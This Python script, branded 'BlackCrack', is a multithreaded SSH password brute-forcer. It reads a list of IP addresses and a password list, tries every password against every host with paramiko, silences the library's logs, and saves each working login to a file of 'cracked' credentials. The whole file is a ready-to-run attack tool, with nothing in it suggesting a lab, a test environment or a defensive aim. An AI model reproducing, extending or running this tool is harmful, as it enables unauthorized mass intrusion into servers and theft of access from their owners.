import time
import os
import paramiko
import logging
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import contextlib
import io
logging.getLogger("paramiko").setLevel(logging.CRITICAL + 100)
logging.getLogger("paramiko.transport").setLevel(logging.CRITICAL + 100)
logging.getLogger("paramiko.transport").propagate = False
@contextlib.contextmanager
def _suppress_paramiko_io():
    with contextlib.redirect_stderr(io.StringIO()), contextlib.redirect_stdout(io.StringIO()):
        yield
os.system("clear")
banner = Fore.LIGHTBLUE_EX + """
    ____  __           __   ______                __  
   / __ )/ /___ ______/ /__/ ____/________ ______/ /__
  / __  / / __ `/ ___/ //_/ /   / ___/ __ `/ ___/ //_/
 / /_/ / / /_/ / /__/ ,< / /___/ /  / /_/ / /__/ ,<   
/_____/_/\__,_/\___/_/|_|\____/_/   \__,_/\___/_/|_| 
Github: https://github.com/nullBlackCode
"""
print(banner)
print("1) Start crack ssh")
print("2) Exit")
class AllSourceCrack:
    def __init__(self):
        self.print_lock = Lock()
        self.successful = 0
        self.failed = 0
        self.total = 0
        self.output_file = "Goods_ssh.txt"
        self.ips = []
        self.passwords = []
        self.username = ""
        self.timeout = 15
        self._stop = False
        self._last_progress = 0
    def get_inputs(self):
        host_file = input(Fore.LIGHTGREEN_EX + "Enter IPs file: ")
        with open(host_file, "r") as f:
            self.ips = [line.strip() for line in f if line.strip()]
        self.username = input(Fore.LIGHTGREEN_EX + "Enter username: ")
        password_file = input(Fore.LIGHTGREEN_EX + "Enter Passwordlist file: ")
        with open(password_file, 'r') as f:
            self.passwords = [line.strip() for line in f if line.strip()]
        self.timeout = int(input(Fore.LIGHTGREEN_EX + "Enter Timeout: "))
        max_workers = int(input(Fore.LIGHTGREEN_EX + "Enter threads (50-200): "))
        print(f"\n✅ {len(self.ips)} IPs | {len(self.passwords)} passwordlist")
        print(f"Total file: {len(self.ips) * len(self.passwords)}")
        return max_workers
    def test_ssh(self, ip, password):
        if self._stop:
            return False
        with self.print_lock:
            self.total += 1
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            with _suppress_paramiko_io():
                client.connect(
                    hostname=ip,
                    username=self.username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            client.close()
            with self.print_lock:
                self.successful += 1
            with self.print_lock:
                print(Fore.GREEN + f"✅ Cracked IP: {ip} | Username: {self.username} | Password: {password}")
                with open(self.output_file, 'a') as f:
                    f.write(f"IP: {ip} | Username: {self.username} | Password: {password}\n")
                    f.write(f"Time: {time.ctime()}\n")
                    f.write("-" * 50 + "\n")
            return True
        except paramiko.AuthenticationException:
            with self.print_lock:
                self.failed += 1
            return False
        except Exception:
            with self.print_lock:
                self.failed += 1
            return False
        finally:
            with self.print_lock:
                if self.total > 0 and self.total != self._last_progress:
                    self._last_progress = self.total
                    self._render_status_line()
    def _render_status_line(self):
        pct = (self.successful / self.total * 100.0) if self.total else 0.0
        msg = (
            f"\r📊 Status | ✅ {self.successful} | ❌ {self.failed} | 📌 {self.total} | "
            f"📈 {pct:.2f}%"
        )
        print(Fore.CYAN + msg, end="", flush=True)
    def show_stats(self):
        with self.print_lock:
            print(Fore.BLUE + f"\n📊 Status:")
            print(Fore.RED + f"   ❌ Failed: {self.failed}")
            print(Fore.LIGHTGREEN_EX + f"   ✅ Successful: {self.successful}")
            print(Fore.YELLOW + f"   📌 Total: {self.total}")
            if self.total > 0:
                print(f"   📈 Progress: {self.successful/self.total*100:.2f}%")
            print("-" * 40)
    def start_cracking(self):
        max_workers = self.get_inputs()
        with open(self.output_file, 'w') as f:
            f.write(f"# SSH Cracking BlackCode\n")
            f.write(f"# Github: https://github.com/nullBlackCode\n")
            f.write(f"# Version 1.1.0\n")
            f.write("-" * 60 + "\n\n")
        self.successful = 0
        self.failed = 0
        self.total = 0
        self._last_progress = 0
        self._stop = False
        print(f"\nStarting crack....")
        self._render_status_line()
        futures = []
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                for ip in self.ips:
                    for pwd in self.passwords:
                        if self._stop:
                            break
                        futures.append(executor.submit(self.test_ssh, ip, pwd))
                completed = 0
                for future in as_completed(futures):
                    if self._stop:
                        break
                    completed += 1
                    try:
                        future.result()
                    except Exception:
                        pass
                    if completed % 50 == 0 and not self._stop:
                        self.show_stats()
                        self._render_status_line()
        except KeyboardInterrupt:
            self._stop = True
        print("\n" + "-" * 50)
        print(Fore.RED + "Finish")
        self.show_stats()
        with open(self.output_file, 'a') as f:
            f.write("\n" + "=" * 50 + "\n")
            f.write(f"✅ Successful: {self.successful}\n")
            f.write(f"❌ Failed: {self.failed}\n")
            f.write(f"📌 Total: {self.total}\n")
            if self.total > 0:
                f.write(f"📈 Success Rate: {self.successful/self.total*100:.2f}%\n")
            f.write(f"🏁 Finished at: {time.ctime()}\n")
try:
    user_input = int(input(Fore.LIGHTYELLOW_EX + "Enter:"))
    if user_input == 1:
        cracker = AllSourceCrack()
        cracker.start_cracking()
    elif user_input == 2:
        print(Fore.LIGHTRED_EX + "EXIT")
    else:
        print(Fore.RED + "❌ ERROR Num")
except ValueError:
    print(Fore.RED + "❌ ERROR Num")
except KeyboardInterrupt:
    print(Fore.RED + "\nERROR")
